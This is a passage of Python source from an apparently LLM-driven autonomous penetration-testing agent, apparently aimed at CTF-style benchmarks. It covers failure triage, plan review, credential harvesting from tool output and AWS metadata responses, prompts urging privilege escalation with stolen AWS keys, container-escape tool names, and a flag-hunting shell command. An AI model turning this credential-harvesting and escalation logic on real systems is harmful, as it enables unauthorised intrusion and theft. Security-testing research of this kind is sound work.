                            extra_terms=[f"{svc_name} exploitation authentication bypass"],
                        ),
                        environment=environment_from_dkg(self.dkg),
                        domains=domains_from_dkg(self.dkg),
                        prior=current_prior(),
                    )
                    if rag_results:
                        rag_text = "\n".join(
                            f"- {r.get('title','')}: "
                            + "; ".join(str(t) for t in (r.get("technique_class") or [])[:2])
                            for r in rag_results[:3]
                        )
                        rag_hint = (
                            f"\n\n[META-COGNITION] The tool failure suggests unfamiliarity with {svc_name}. "
                            f"Candidate technique classes for {svc_name}:\n{rag_text}\n"
                            f"Based on these candidates, re-evaluate whether the task can be fixed "
                            f"by using the correct tool/protocol for {svc_name}."
                        )
                except Exception as exc:
                    log.debug("swallowed exception: %s", exc, exc_info=True)

        # Detect timeout/hang failures and add targeted hints
        timeout_hint = ""
        if ("timed out" in output_lower or "no output" in output_lower
                or "exit=-1" in output or "timeout" in output_lower):
            timeout_hint = (
                "\nThis task TIMED OUT or produced no output. "
                "Common causes for shell_exec timeouts:\n"
                "- An interactive prompt waiting for user input (e.g. ssh-keygen "
                "asking to overwrite an existing file, or asking for a passphrase)\n"
                "- A command that hangs waiting for network/input\n"
                "Fix by: adding flags to skip prompts (ssh-keygen: use -N '' for "
                "empty passphrase + rm -f the output file first to avoid overwrite "
                "prompt), or adding a timeout prefix.\n"
            )

        prompt = f"""A task failed during execution. Analyze whether the failure
is due to incorrect tool parameters (fixable) or because the target
is genuinely not vulnerable to this attack (not fixable).

Task instruction: {instruction}
Tool called: {tool}
Tool contract (declared parameters — corrected_params keys MUST be among these):
{self._render_tool_params(tool)}
Parameters used: {params_str}
Tool output:
{output_trunc}
{timeout_hint}
{rag_hint}
{self._http_alternative_block(tool)}
Classify:
- "fixable" if the tool was called with wrong/malformed parameters
  (e.g. wrong command syntax, non-existent file path, missing required
  args, command would cause an interactive prompt). A failure that says the
  request used the wrong HTTP method (405 + Allow header, or a route that
  only accepts a verb this tool cannot send) is ALSO fixable: set "tool" to
  one of the alternatives above that can express that verb, and put its
  parameters in corrected_params.
- "partial_success" if the tool connected and authenticated successfully
  but a sub-command within the tool failed (e.g. MSSQL login OK but
  xp_cmdshell command not found). Credentials are valid — store them.
- "not_fixable" if the tool executed correctly but the attack didn't
  work (e.g. target not vulnerable, authentication failed, credential
  rejected, service not available, connection refused)

If fixable, provide corrected_params.
If partial_success, include credentials: {{"username":...}}.
Otherwise not_fixable.

Output ONLY valid JSON:
{{"fixable": true/false, "tool": "name of the tool to use (optional; only when
the current tool cannot express the required request)", "corrected_params":
{{...}}, "partial_success": true/false, "credentials": {{...}}, "reason": "..."}}"""

        try:
            with self._llm_isolated():
                content, _ = await self._llm_generate_async(
                    prompt=prompt, system_prompt=SYSTEM_PROMPT_EVALUATOR,
                    stage="fix_analysis",
                )
            # Extract JSON from response
            match = re.search(r"\{[\s\S]*\}", content)
            if not match:
                return None
            result = json.loads(match.group(0))
            if result.get("fixable") and result.get("corrected_params"):
                return {
                    "fixable": True,
                    "tool": str(result.get("tool", "") or ""),
                    "corrected_params": result["corrected_params"],
                    "reason": result.get("reason", ""),
                }
            if result.get("fixable") and result.get("tool"):
                # Tool-only repair: the verb/method is wrong, the parameters
                # carry over.
                return {
                    "fixable": True,
                    "tool": str(result["tool"]),
                    "corrected_params": result.get("corrected_params") or {},
                    "reason": result.get("reason", "switch tool"),
                }
            if result.get("partial_success"):
                return {
                    "fixable": False,
                    "partial_success": True,
                    "credentials": result.get("credentials", {}),
                    "reason": result.get("reason", ""),
                }
        except Exception as exc:
            log.debug("swallowed exception: %s", exc, exc_info=True)
        return None

    async def _extract_credentials_from_task(
        self, task: Task, raw_stdouts: list[str]
    ) -> None:
        """Extract discovered credentials from task stdout → DKG + memory.

        Regex pre-filters for credential patterns, then uses a lightweight
        LLM call (classifier profile, isolated session) to extract structured
        username:password pairs. Only fires for tools that commonly discover
        credentials (shell_exec, ssh_exec, test_credential).

        Extracted credentials are stored as DKG Credential nodes and in the
        cross-task credential memory, making them available for
        $credentials.* placeholder resolution in subsequent tasks.
        """
        tool = str((task.action or {}).get("tool", "") or "")
        if tool not in ("shell_exec", "ssh_exec", "test_credential",
                        "aws_cli", "curl_get", "ssrf_probe"):
            return

        combined = "\n".join(raw_stdouts)
        if len(combined) < 20:
            return

        # ── AWS credential extraction ──────────────────────────────
        # IMDS returns AccessKeyId/SecretAccessKey/Token — extract these
        # directly without requiring an LLM call (format is well-known).
        _aws_json_match = re.search(
            r'"AccessKeyId"\s*:\s*"([^"]+)"\s*,\s*"SecretAccessKey"\s*:\s*"([^"]+)"'
            r'(?:,\s*"Token"\s*:\s*"([^"]+)")?',
            combined,
        )
        if _aws_json_match:
            _ak = _aws_json_match.group(1)
            _sk = _aws_json_match.group(2)
            _token = _aws_json_match.group(3) or ""
            _host = ""
            _port = ""
            for s in self.dkg.query_nodes("Service"):
                _p = s.get("port", 0)
                if _p:
                    _host = "localhost"
                    _port = str(_p)
                    break
            cred_id = f"cred-aws-{_ak[:8]}-{int(time.time()) % 100000}"
            self.dkg.add_node("Credential", cred_id, {
                "username": _ak, "password": _sk,
                "access_key": _ak, "secret_key": _sk, "session_token": _token,
                "cred_type": "aws", "source_host": _host or "localhost",
                "port": int(_port) if _port else 0,
                "source": "imds_extracted",
            })
            log.info("Extracted AWS credentials: AccessKeyId=%s... SecretAccessKey=%s...",
                     _ak[:12], _sk[:8])
            return

        # ── Regex pre-filter ────────────────────────────────────────
        # Avoid LLM cost when stdout clearly doesn't contain credentials.
        _has_success = bool(re.search(
            r'(?i)(success|成功|working|valid|found|凭证|密码正确|login\s+ok|authenticated)',
            combined,
        ))
        if not _has_success:
            return

        # Check for username:password or user/pass patterns near success
        _cred_patterns = re.findall(
            r'(?i)(?:SUCCESS|OK|working|valid|found)[^\n]{0,80}?'
            r'(\w[\w.-]{1,30})\s*[:/]\s*(\S{1,50})',
            combined,
        )
        if not _cred_patterns:
            # Fallback: bare user:pass patterns anywhere in output
            _cred_patterns = re.findall(
                r'(?:^|\s)(\w{2,20}):(\S{3,50})(?:\s|$)',
                combined,
            )
        if not _cred_patterns:
            return

        # ── LLM extraction (isolated session, classifier profile) ──
        _port = ""
        _svc_name = "ssh"
        _task_params = (task.action or {}).get("params", {}) or {}
        if isinstance(_task_params, dict):
            _port = str(_task_params.get("port", ""))
            _cmd = str(_task_params.get("command", ""))
            if "mysql" in _cmd.lower():
                _svc_name = "mysql"
            elif "psql" in _cmd.lower() or "postgres" in _cmd.lower():
                _svc_name = "postgres"
            elif "redis" in _cmd.lower():
                _svc_name = "redis"
            elif "mssql" in _cmd.lower():
                _svc_name = "mssql"
        # Fallback: look up SSH port from DKG Service nodes
        if not _port:
            for s in self.dkg.query_nodes("Service"):
                _svc_name_s = (s.get("service_name", "") or "").lower()
                if "ssh" in _svc_name_s:
                    _p = s.get("port", 0)
                    if _p:
                        _port = str(_p)
                        break

        _output_snippet = combined[:2000]
        _candidates_str = ", ".join(
            f"{u}:{p}" for u, p in _cred_patterns[:15]
        )
        instruction = getattr(task, "instruction", "")
        prompt = (
            f"A penetration testing task discovered working credentials. "
            f"Extract ALL valid username:password pairs from the output.\n\n"
            f"Task instruction: {instruction[:200]}\n"
            f"Service: {_svc_name}\n"
            f"Regex candidates: {_candidates_str}\n\n"
            f"Task output:\n{_output_snippet}\n\n"
            f"Return ONLY valid JSON — an array of credential objects:\n"
            f'[{{"username":"...", "password":"..."}}]\n'
            f'If no valid credentials found, return: []'
        )

        try:
            from darwin.utils.llm import LLMSession
            _classifier = LLMSession.from_config("classifier")
            _classifier.thought_logger = getattr(self, "thought_logger", None)
            content, _ = _classifier.generate(prompt=prompt, stage="credential_extraction")
            if not content:
                return
            # Extract JSON from response
            match = re.search(r"\[[\s\S]*?\]", content)
            if not match:
                return
            creds_list = json.loads(match.group(0))
            if not isinstance(creds_list, list) or not creds_list:
                return
        except Exception:
            return

        # ── Store in DKG + credential memory ────────────────────────
        for cred in creds_list:
            username = str(cred.get("username", "")).strip()
            password = str(cred.get("password", "")).strip()
            if not username or not password:
                continue
            _cred_id = f"cred-discovered-{username}-{int(time.time())}"
            self.dkg.add_node("Credential", _cred_id, {
                "username": username,
                "password": password,
                "host": self.target_host,
                "port": int(_port) if _port and _port.isdigit() else 0,
                "source_host": self.target_host,
                "cred_type": _svc_name,
                "source": "task_discovery",
            })
            try:
                self.credential_memory.record(
                    host=self.target_host,
                    port=int(_port) if _port and _port.isdigit() else 0,
                    service_type=_svc_name,
                    username=username, password=password,
                    source="task_discovery",
                    scope=self.memory_scope(),
                    environment=self.memory_environment(),
                )
            except Exception as exc:
                log.debug("swallowed exception: %s", exc, exc_info=True)
            log.info(
                "Credential extracted from task output: %s:*** → DKG + credential memory",
                username,
            )
            print(f"\n[CRED] Discovered: {username}:**** → stored for subsequent tasks")

    # ── Plan task dedup + capping helpers ──────────────────────────────

    @staticmethod
    def _is_duplicate_task(new_task: Task, existing_tasks: list[Task]) -> bool:
        """Check if *new_task* is a semantic duplicate of any pending task.

        Two checks:
        1. Same tool + same endpoint → definite duplicate
        2. Instruction word overlap > 75% → near-duplicate
        """
        _nt_inst = (new_task.instruction or "").lower()
        _nt_tool = str((new_task.action or {}).get("tool", "") or "").lower()
        _nt_params = (new_task.action or {}).get("params", {}) or {}
        _nt_endpoint = (
            (new_task.action or {}).get("target", "")
            or _nt_params.get("target_url", "")
            or _nt_params.get("url", "")
            or _nt_params.get("target", "")
            or _nt_params.get("host", "")
        ).lower()

        for pt in existing_tasks:
            if pt.status not in (TaskStatus.READY, TaskStatus.CREATED):
                continue
            # Same tool + same endpoint = definite duplicate
            _pt_tool = str((pt.action or {}).get("tool", "") or "").lower()
            _pt_params = (pt.action or {}).get("params", {}) or {}
            _pt_endpoint = (
                (pt.action or {}).get("target", "")
                or _pt_params.get("target_url", "")
                or _pt_params.get("url", "")
                or _pt_params.get("target", "")
                or _pt_params.get("host", "")
            ).lower()
            if _nt_tool and _pt_tool and _nt_endpoint and _pt_endpoint:
                if _nt_tool == _pt_tool and _nt_endpoint == _pt_endpoint:
                    return True
            # Word overlap ratio check (fallback)
            _pt_inst = (pt.instruction or "").lower()
            if _nt_inst and _pt_inst:
                _nt_words = set(_nt_inst.split())
                _pt_words = set(_pt_inst.split())
                if _nt_words and _pt_words:
                    _overlap = len(_nt_words & _pt_words) / min(len(_nt_words), len(_pt_words))
                    if _overlap > 0.75:
                        return True
        return False

    def _cap_pending_tasks(self, tasks: list[Task], max_total: int = 20,
                           max_new_this_cycle: int = 8) -> list[Task]:
        """Trim lowest-quality pending tasks when plan exceeds *max_total*.

        Triaged in this order (highest value first):
        1. Tasks that exercise a route the service documented but nobody has
           tested yet — dropping one of these ends the run with the advertised
           surface unexplored.
        2. Tasks whose (tool, endpoint, method, params) has not already run:
           the framework cannot learn anything from re-running a signature.
        3. Tasks WITH a tool sort before tasks without; fewer dependencies
           first; ties break in favour of the newest plan-review task, which
           is the one written against the latest evidence.

        Returns the (possibly trimmed) task list.
        """
        if len(tasks) <= max_total:
            return tasks

        _pending = [
            t for t in tasks
            if t.status in (TaskStatus.READY, TaskStatus.CREATED)
        ]
        _non_pending = [
            t for t in tasks
            if t.status not in (TaskStatus.READY, TaskStatus.CREATED)
        ]
        _keep_pending = max(0, max_total - len(_non_pending))

        if len(_pending) <= _keep_pending:
            return tasks

        # Routes the target documented but nobody has exercised yet: a task
        # covering one of them must survive the cap.
        try:
            _required_routes = set(self._untested_documented_routes())
        except Exception as exc:
            log.debug("documented-route lookup failed for cap: %s", exc)
            _required_routes = set()
        # Signatures already exercised: the framework learns nothing from a
        # task that would repeat one.
        _run_signatures = set(getattr(self, "_executed_signatures", set()) or set())

        def _task_url(t) -> str:
            _p = (t.action or {}).get("params", {}) or {}
            return str(_p.get("url", _p.get("target_url", "")) or "").rstrip("/")

        def _covers_documented_route(t) -> bool:
            if not _required_routes:
                return False
            _tool = str((t.action or {}).get("tool", "") or "")
            _url = _task_url(t)
            if not _url:
                return False
            _methods = {m for u, m in _required_routes if u.rstrip("/") == _url}
            if not _methods:
                return False
            _body_kind = request_body_kind((t.action or {}).get("params", {}) or {})
            if _tool and not http_tool_can_express(_tool, _methods, _body_kind):
                return False
            return True

        def _repeats_executed(t) -> bool:
            _tool = str((t.action or {}).get("tool", "") or "")
            if not _tool or not _run_signatures:
                return False
            return (_tool, _task_url(t)) in _run_signatures

        _order = {t.id: index for index, t in enumerate(_pending)}

        def _quality_key(t):
            deps = len(dependency_task_ids(t))
            has_tool = 1 if (t.action or {}).get("tool", "") else 0
            # Lower key sorts first (kept). Coverage tasks first, then tasks
            # that add new information, then the cheaper/shorter ones. The
            # last component keeps the NEWEST plan-review task on ties: it was
            # written against the latest evidence.
            return (
                0 if _covers_documented_route(t) else 1,
                1 if _repeats_executed(t) else 0,
                deps,
                -has_tool,
                -_order.get(t.id, 0),
            )

        _pending.sort(key=_quality_key)
        # A plan review used to trim the only pending task for an endpoint and
        # then re-generate an equivalent one, so the same surface was never
        # actually tested (benchmark logs: ssrf_probe / command_injection_test /
        # sqlmap_test trimmed, then rebuilt). Keep one task per endpoint.
        _endpoint_counts: dict[str, int] = {}
        for _task in _pending:
            _url = _task_url(_task)
            if _url:
                _endpoint_counts[_url] = _endpoint_counts.get(_url, 0) + 1
        _kept_endpoints: set[str] = set()
        _protected: list[Task] = []
        _trimmable: list[Task] = []
        for _task in _pending:
            _url = _task_url(_task)
            if (
                _url
                and _endpoint_counts.get(_url, 0) <= 1
                and _url not in _kept_endpoints
                and not _repeats_executed(_task)
            ):
                _kept_endpoints.add(_url)
                _protected.append(_task)
            else:
                _trimmable.append(_task)
        _keep_extra = max(0, _keep_pending - len(_protected))
        _trim_targets = _trimmable[_keep_extra:]
        _to_remove = set(t.id for t in _trim_targets)
        _removed_count = len(_to_remove)

        if _removed_count > 0:
            _removed_tools = [
                (t.action or {}).get("tool", "?") for t in _trim_targets
            ]
            print(f"\n[PLAN-CAP] Trimmed {_removed_count} low-quality pending task(s): {_removed_tools}")

        return [t for t in tasks if t.id not in _to_remove]

    def _enforce_write_intent(
        self, tasks: list[Task], pre_review: dict[str, tuple[str, dict]],
    ) -> list[str]:
        """Keep a review from destroying the plan's write steps.

        Blocked tasks are not part of the preserved set, so a review replaces
        them wholesale — and it has been observed replacing a
        ``http_method_probe(method=PUT)`` task with a POST-only tool, which
        makes the write unreachable. A replacement is accepted only when it
        is itself a write that can express the original method; otherwise the
        pre-review tool/params are restored. Returns the reverted task ids.
        """
        reverted: list[str] = []
        for task in tasks or []:
            original = (pre_review or {}).get(task.id)
            if not original:
                continue
            orig_tool, orig_params = original
            orig_method = _call_method(orig_tool, orig_params)
            if orig_method not in _WRITE_METHODS:
                continue
            new_tool = str((task.action or {}).get("tool", "") or "")
            new_params = dict((task.action or {}).get("params", {}) or {})
            if new_tool == orig_tool:
                continue
            new_method = _call_method(new_tool, new_params)
            if _planned_write_intent(new_tool, new_params) and (
                new_method == orig_method or not new_method
            ):
                continue
            log.warning(
                "[PLAN REVIEW] reverted write task %s: %s(%s) cannot express "
                "%s — keeping %s",
                task.id, new_tool or "?", new_method or "-",
                orig_method, orig_tool,
            )
            task.action = {
                **(task.action or {}),
                "tool": orig_tool,
                "params": dict(orig_params),
            }
            realign_success_condition(
                getattr(task, "success_condition", None), orig_tool,
            )
            reverted.append(task.id)
        return reverted

    def _review_skip_reason(self, task: Task, force: bool = False) -> str:
        """Why the plan review should be skipped now ("" = run it).

        A review regenerates the whole task list, so it is worth its cost only
        when something changed: new evidence (a discovered route, credential
        or service), or a failure that says the PLAN is wrong rather than the
        hypothesis. Otherwise the plan needs
        ``_MIN_EXECUTIONS_BETWEEN_REVIEWS`` executions before another rewrite.
        A stall review (nothing left to execute) is unavoidable, but a second
        one with zero executions in between is not. Late in the run a rewrite
        costs more than it can return, so it is skipped outright.
        """
        # The budget gate is not negotiable: ``force`` means "review as soon as
        # the cadence allows", not "review with no time left to finish".
        try:
            _remaining = float(self._remaining_budget())
        except Exception:
            _remaining = float("inf")
        if _remaining < self._llm_min_remaining():
            return (
                f"Skipping plan review: only {_remaining:.0f}s of budget left "
                f"(minimum {self._llm_min_remaining():.0f}s to start an LLM call)"
            )
        if force:
            return ""
        if _remaining < _REVIEW_MIN_REMAINING_SECONDS:
            return (
                f"Skipping plan review: only {_remaining:.0f}s of budget left "
                f"(minimum {_REVIEW_MIN_REMAINING_SECONDS:.0f}s)"
            )
        if not getattr(self, "_review_done_this_cycle", False):
            return ""
        if getattr(self, "_evidence_since_review", False):
            return ""
        if str(getattr(self, "_last_failure_type", "") or "") in (
            _REVIEW_TRIGGERING_FAILURES
        ):
            return ""
        executions = int(getattr(self, "_executions_since_review", 0) or 0)
        if executions >= _MIN_EXECUTIONS_BETWEEN_REVIEWS:
            return ""
        if str(getattr(task, "id", "")) != "plan-exhausted":
            return (
                f"Skipping plan review after task {task.id}: {executions} "
                f"executed task(s) since the last review "
                f"(need {_MIN_EXECUTIONS_BETWEEN_REVIEWS})"
            )
        if getattr(self, "_stall_review_since_execution", False):
            return (
                "Skipping repeated stall review: no task executed since the "
                "previous review"
            )
        self._stall_review_since_execution = True
        return ""

    async def _review_and_update_plan(
        self, task: Task, success: bool, task_result: str = "",
        force: bool = False,
    ) -> None:
        """Review the plan after a task and let the LLM add/remove/reorder.

        Status bookkeeping always runs; the LLM call is gated on there being
        something to react to (a failure, or a change to the world model).
        Reviewing after every successful no-op task consumed whole minutes of
        the exploit allowance without changing the plan.
        """
        if not getattr(self, 'exploitation_plan', None):
            return
        # Do not spend the last part of the exploit allowance on another
        # full plan-review generation; preserve time for executable tasks.
        if self._remaining_budget() < max(20.0, self.time_budget * 0.03):
            log.info("Skipping plan review: %.1fs remain", self._remaining_budget())
            return

        # Local attack-path replan: paths that became stale/rejected release
        # the tasks blocked on them into the replanning queue.
        try:
            self._migrate_blocked_path_tasks()
        except Exception as exc:
            log.debug("swallowed exception: %s", exc, exc_info=True)

        # Mark task status with retry enforcement
        _task_tool = str((task.action or {}).get("tool", "") or "")
        task.attempt_count += 1
        if success:
            task.status = TaskStatus.SUCCESS
        elif task.attempt_count >= self._task_attempt_limit:
            task.status = TaskStatus.ABANDONED
            self._exhausted_task_ids.add(task.id)
            log.warning("Task %s exhausted after %d attempts",
                        task.id, task.attempt_count)
        else:
            task.status = TaskStatus.FAILED
        task.result_summary = task_result[:2000]
        # O2.2: keep PlanMemory status in sync — the entry recorded before
        # execution still said "pending"; replan_context() relies on the
        # status to decide which rationale is still active.
        try:
            self.memory.record_task(task)
        except Exception as exc:
            log.debug("swallowed exception: %s", exc, exc_info=True)

        # Pre-review snapshot of every task's tool+params. The review may
        # replace a blocked task wholesale (blocked tasks are not in the
        # preserved set), so the guard below needs the original write intent
        # to detect a downgrade.
        _pre_review: dict[str, tuple[str, dict]] = {
            t.id: (
                str((t.action or {}).get("tool", "") or ""),
                dict((t.action or {}).get("params", {}) or {}),
            )
            for t in (self.exploitation_plan.tasks or [])
        }

        # Build prompt: what just happened + current plan + new DKG state
        state = self._get_state()
        _topology_diff_text = ""
        try:
            before_topology = getattr(self, "_topology_before", None)
            # Only emit a per-task topology diff when a real baseline was
            # captured before execution. Stall/plan-exhausted reviews have no
            # baseline; diffing against an empty snapshot would misreport the
            # whole graph as newly added.
            if before_topology is not None:
                after_topology = self.dkg.topology_snapshot()
                diff = self.dkg.topology_diff(before_topology, after_topology)
                changed = any(diff.get(key) for key in (
                    "added_nodes", "removed_nodes", "updated_nodes",
                    "added_edges", "removed_edges",
                ))
                if changed:
                    lines = [
                        "## Topology Changes This Task",
                        f"revision {diff.get('from_revision', 0)} -> {diff.get('to_revision', 0)}",
                    ]
                    for key, label in (
                        ("added_nodes", "added nodes"),
                        ("removed_nodes", "removed nodes"),
                        ("updated_nodes", "updated nodes"),
                        ("added_edges", "added edges"),
                        ("removed_edges", "removed edges"),
                    ):
                        rows = diff.get(key) or []
                        if rows:
                            lines.append(f"{label}: {json.dumps(rows[:8], default=str)[:1200]}")
                    _topology_diff_text = "\n" + "\n".join(lines) + "\n"
            self._topology_before = None
        except Exception as exc:
            log.debug("swallowed exception: %s", exc, exc_info=True)
        # O1.2: diff-based discoveries — the review LLM sees exactly which
        # nodes this task added to the world model. Falls back to the legacy
        # "latest endpoints/credentials" view when there is no per-task
        # baseline (e.g. the plan-exhausted review).
        _before_nodes = getattr(self, "_cognition_before", None)
        _had_baseline = _before_nodes is not None
        try:
            _discovered_nodes = render_new_discoveries(_before_nodes, self.dkg)
        except Exception:
            _discovered_nodes = ""
        self._cognition_before = None
        # Something new to reason about: a failure, a changed world model, or
        # an explicit stall review.  Otherwise the plan cannot improve and the
        # LLM round-trip is pure cost.
        _has_delta = bool((_discovered_nodes or "").strip()) or bool(
            (_topology_diff_text or "").strip()
        )
        if success and _had_baseline and not _has_delta and not force:
            log.info(
                "Skipping plan review after task %s: no new state discovered",
                task.id,
            )
            return
        new_discoveries = _discovered_nodes
        if not new_discoveries:
            if state.endpoints:
                new_discoveries = "\n## Latest Discoveries\n" + "\n".join(
                    f"  - {ep.method} {ep.url}"
                    + (f" params={ep.params}" if ep.params else "")
                    for ep in state.endpoints[-5:]
                )
            if state.credentials:
                new_discoveries += "\n## Credentials\n" + "\n".join(
                    f"  - {c.username}@{c.source_host}" for c in state.credentials
                )
        else:
            new_discoveries = f"\n{new_discoveries}"

        # If the task was reading a config/credential file, flag it explicitly
        cred_reminder = ""
        api_reminder = ""
        unexpected_data = ""
        _aws_fail_reminder = ""
        if success and task_result:
            task_result_lower = task_result.lower()
            if any(kw in task_result_lower for kw in
                   ("token:", "client-certificate-data", "bearer",
                    "password:", "apiVersion:", "server: https://",
                    "success:", "login ok", "auth ok", "connected")):
                cred_reminder = (
                    "\nIMPORTANT: The task output above CONTAINS WORKING CREDENTIALS. "
                    "You MUST update ALL pending tasks that connect to this service "
                    "to use the discovered credentials (username and password). "
                    "If any pending task still has placeholder/wrong credentials in "
                    "its params, CORRECT them now. "
                    "If the output shows 'server: https://HOST:PORT', use that "
                    "exact URL with the credentials from the same file. "
                    "Send authenticated requests with curl_get: "
                    'headers="Authorization: Bearer <token>", insecure=true.\n'
                )
                # AWS/cloud credential detection
                if any(kw in task_result_lower for kw in
                       ("accesskeyid", "secretaccesskey", "sessiontoken",
                        "aws_access_key", "iam/security-credentials",
                        "assumerole", "temporary credential")):
                    cred_reminder += (
                        "\nCLOUD CREDENTIALS FOUND: The output contains AWS IAM "
                        "credentials (AccessKeyId/SecretAccessKey/Token). IMMEDIATELY "
                        "add tasks to use these with aws_cli:\n"
                        "  - aws sts get-caller-identity\n"
                        "  - aws s3 ls (for data access)\n"
                        "  - aws iam list-roles (for privilege escalation)\n"
                        "For local cloud simulators, use "
                        "--endpoint-url http://localhost:PORT in payload_json.\n"
                    )
                # S3 / object storage detection
                if any(kw in task_result_lower for kw in
                       ("s3", "bucket", "object storage", "listobjects",
                        "getobject", ".s3.")):
                    cred_reminder += (
                        "\nS3 / OBJECT STORAGE DETECTED: Try accessing with aws_cli:\n"
                        "  - aws s3 ls --no-sign-request (unauthenticated)\n"
                        "  - aws s3 cp s3://bucket/flag.txt - --no-sign-request\n"
                        "For local S3 simulators, add "
                        "--endpoint-url http://localhost:PORT to payload_json.\n"
                    )
            # aws_cli failure on local endpoints: the LLM often retries
            # aws_cli indefinitely against local simulators that don't
            # fully implement the AWS API.  Signal to switch tools.
            _aws_fail_reminder = ""
            if (not success and _task_tool == "aws_cli"
                    and any(kw in task_result_lower for kw in
                            ("could not connect", "connection refused",
                             "not found", "internal server error",
                             "reached max retries"))):
                _aws_fail_reminder = (
                    "\nAWS CLI FAILURE: The aws_cli call failed against this "
                    "local endpoint.  Local cloud simulators often implement "
                    "only a subset of the full AWS API.  DO NOT retry aws_cli "
                    "with the same parameters — switch to curl_get or http_post "
                    "to access the endpoint via its REST API directly.  Try "
                    "GET on the root path, GET on known object keys, and POST "
                    "with JSON body.\n"
                )
            # Detect REST API / OpenAPI discovery
            if any(kw in task_result_lower for kw in
                   ("openapi", "swagger", "\"kind\"", "\"apiVersion\"",
                    "\"paths\"", "\"items\"", "\"metadata\"", "namespaces")):
                api_reminder = (
                    "\nIMPORTANT: The output above contains a REST API response or "
                    "OpenAPI spec. You MUST add tasks to explore these API paths: "
                    "list resources, access individual items by ID from the response, "
                    "check nested sub-resources. If there's an OpenAPI spec, read it "
                    "fully and use the documented paths. The flag is likely in a data "
                    "field returned by one of these API calls.\n"
                )
            # Detect structured data that doesn't match the tool used —
            # the service may have capabilities beyond current hypothesis
            _structured_indicators = (
                '"arn:', '"policy', '"permission', '"principal"',
                '"statement"', '"effect"', '"action"', '"resource"',
            )
            if any(kw in task_result_lower for kw in _structured_indicators):
                unexpected_data = (
                    "\nNOTE: The response contains structured permission/policy "
                    "data that doesn't match the tool you just called. The service "
                    "may have capabilities (access control, privilege management) "
                    "beyond its apparent purpose. Consider whether your initial "
                    "hypothesis about this application is correct — try tools and "
                    "operations that match the UNEXPECTED data you're seeing.\n"
                )

        _absent_text = ""
        if self._absent_services:
            _absent_text = (
                f"\n## Unreachable (do NOT probe again)\n"
                f"{', '.join(sorted(self._absent_services)[:8])}\n"
            )
        _absent_text += "\n" + self._unusable_tools_note()

        # Detect plan drift: when primary target has failed tasks, remind LLM
        # to fix them BEFORE exploring incidentally discovered HTTP ports.
        focus_reminder = ""
        plan = self.exploitation_plan
        if plan and plan.tasks:
            failed_primary = [
                t for t in plan.tasks
                if t.status is TaskStatus.FAILED
                and not any(kw in (t.instruction or "").lower()
                           for kw in ("probe ", "whatweb", "identify ", "check if port"))
            ]
            pending_primary = [
                t for t in plan.tasks
                if t.status in (TaskStatus.READY, TaskStatus.CREATED)
                and not any(kw in (t.instruction or "").lower()
                           for kw in ("probe ", "whatweb", "identify ", "check if port"))
            ]
            if failed_primary:
                failed_insts = [t.instruction[:100] for t in failed_primary[:4]]
                focus_reminder = (
                    f"\nFOCUS: You have {len(failed_primary)} FAILED exploitation "
                    f"tasks that MUST be retried with corrected tools/params:\n"
                    + "\n".join(f"  - {inst}" for inst in failed_insts)
                    + f"\nThese are your PRIMARY target. RETRY them with the tool "
                    f"that previously succeeded for this target (check DONE tasks "
                    f"for working tool/param patterns). "
                    f"Do NOT add HTTP probe tasks for incidentally discovered "
                    f"ports until these primary exploitation tasks are DONE.\n"
                )
            elif pending_primary:
                focus_reminder = (
                    f"\nFOCUS: {len(pending_primary)} pending exploitation tasks "
                    f"for the PRIMARY target must be completed BEFORE adding tasks "
                    f"for incidentally discovered HTTP ports.\n"
                )

        # ── Post-exploitation flag hunt reminder ──
        # If ANY task gained shell/container/command execution, push the LLM
        # to search for flag files BEFORE doing anything else.
        _post_exploit_reminder = ""
        if plan and plan.tasks:
            # Target-side execution tools only. shell_exec runs on the DARWIN
            # host, NOT on the target, so it never counts as target access and
            # must never be used for flag file hunting (flags found by local
            # filesystem searches are rejected by _verify_flag).
            _shell_tools = {
                "ssh_exec", "ssh_key_exec", "kubectl_exec", "kubectl_run",
                "nsenter_exec", "container_escape_docker_sock",
                "container_escape_docker_api", "container_escape_cgroup",
                "container_escape_mount_disk", "container_escape_cap_dac",
                "container_escape_runc", "container_escape_procfs",
            }
            _has_shell = any(
                t.status is TaskStatus.SUCCESS
                and str((t.action or {}).get("tool", "") or "") in _shell_tools
                for t in plan.tasks
            )
            # Also check if the current task output shows shell/container access
            if not _has_shell and _task_tool in _shell_tools and success:
                _has_shell = True

            if _has_shell:
                _done_flag_hunt = any(
                    t.status is TaskStatus.SUCCESS
                    and "flag" in (t.instruction or "").lower()
                    and str((t.action or {}).get("tool", "") or "") in _shell_tools
                    for t in plan.tasks
                )
                if not _done_flag_hunt:
                    _post_exploit_reminder = (
                        f"\nFLAG HUNT (HIGHEST PRIORITY): You have target-side "
                        f"shell/container access! IMMEDIATELY add tasks to search "
                        f"for flag files ON THE TARGET filesystem:\n"
                        f"  - Use the tool that granted remote execution (ssh_exec, "
                        f"ssh_key_exec, kubectl_exec, container escape tools). NEVER "
                        f"use shell_exec — it runs on the DARWIN host, not the target, "
                        f"and its flags are rejected.\n"
                        f"  - Command template: ls -la / && cat /flag* /root/flag* "
                        f"/tmp/flag* /home/*/flag* /app/flag* 2>/dev/null; "
                        f"find / -maxdepth 4 -name '*flag*' -type f 2>/dev/null | head -10\n"
                        f"Flag files are the #1 CTF pattern. Do NOT enumerate databases "
                        f"or configure services before hunting flags on the target.\n"
                    )

        # P10/P11: inject preserved memory (task rationale + execution
        # history) so the replan LLM never loses decision provenance.
        _memory_text = ""
        try:
            _mem_ctx = self.memory.replan_context(task.id)
            if _mem_ctx:
                _memory_text = (
                    f"## Preserved Memory (rationale & evidence)\n"
                    f"{_mem_ctx[:2000]}\n"
                )
        except Exception as exc:
            log.debug("swallowed exception: %s", exc, exc_info=True)

        # P15 G2: inject DKG node provenance so the replan LLM can judge
        # how trustworthy each world-state fact is.
        _provenance_text = ""
        try:
            _prov_ctx = self.provenance_summary()
            if _prov_ctx:
                _provenance_text = (
                    f"## World State Provenance (source & evidence)\n"
                    f"{_prov_ctx}\n"
                )
        except Exception as exc:
            log.debug("swallowed exception: %s", exc, exc_info=True)

        # O1.3: unified cognition snapshot — beliefs (hypotheses with
        # confidence/status), plan summary, defense and preserved rationale,
        # so the review LLM plans from the same world model as execution.
        _belief_text = ""
        try:
            _belief_text = self._belief_context(compact=True)
            if _belief_text:
                _belief_text = f"\n{_belief_text}\n"
        except Exception as exc:
            log.debug("swallowed exception: %s", exc, exc_info=True)

        _review_tool_defs: list[dict] = []
        for _gw in (self.attack_gateway, self.recon_gateway):
            try:
                _review_tool_defs.extend(_gw.get_tool_definitions())
            except Exception as exc:
